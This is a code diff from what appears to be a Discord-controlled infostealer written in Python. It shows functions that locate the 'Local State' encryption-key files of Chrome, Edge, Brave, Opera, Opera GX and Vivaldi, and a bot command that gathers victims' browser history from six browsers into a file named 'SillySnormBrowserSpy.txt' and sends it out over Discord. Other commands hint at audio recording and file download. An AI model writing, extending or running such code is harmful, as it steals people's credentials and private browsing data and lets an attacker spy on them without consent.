@@ -74,18 +74,18 @@ def record_audio():
 
 def get_encryption_key(browser="chrome"):
     try:
-    if browser == "chrome":
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-    elif browser == "edge":
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
-    elif browser == "brave":
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
-    elif browser == "opera":
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
-    elif browser == "opera_gx":
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
-    elif browser == "vivaldi":
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data", "Local State")
+        if browser == "chrome":
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+        elif browser == "edge":
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
+        elif browser == "brave":
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
+        elif browser == "opera":
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
+        elif browser == "opera_gx":
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
+        elif browser == "vivaldi":
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data", "Local State")
         else:
             raise ValueError("Unsupported browser specified")
 
@@ -370,9 +370,21 @@ def get_browser_history(browser_name):
 async def browser(ctx):
     chrome_history = get_browser_history("Chrome")
     edge_history = get_browser_history("Edge")
+    brave_history = get_browser_history("Brave")
+    vivaldi_history = get_browser_history("Vivaldi")
+    opera_history = get_browser_history("Opera")
+    opera_gx_history = get_browser_history("Opera GX")
+    
+    file_name = "SillySnormBrowserSpy.txt"
+    with open(file_name, "w", encoding="utf-8") as file:
+        file.write(chrome_history)
+        file.write(edge_history)
+        file.write(brave_history)
+        file.write(vivaldi_history)
+        file.write(opera_history)
+        file.write(opera_gx_history)
 
-    await ctx.send(f"{chrome_history}\n\n{edge_history}")
-
+    await ctx.send(file=discord.File(file_name))
 @bot.command()
 async def download(ctx, file_path: str):
     try:
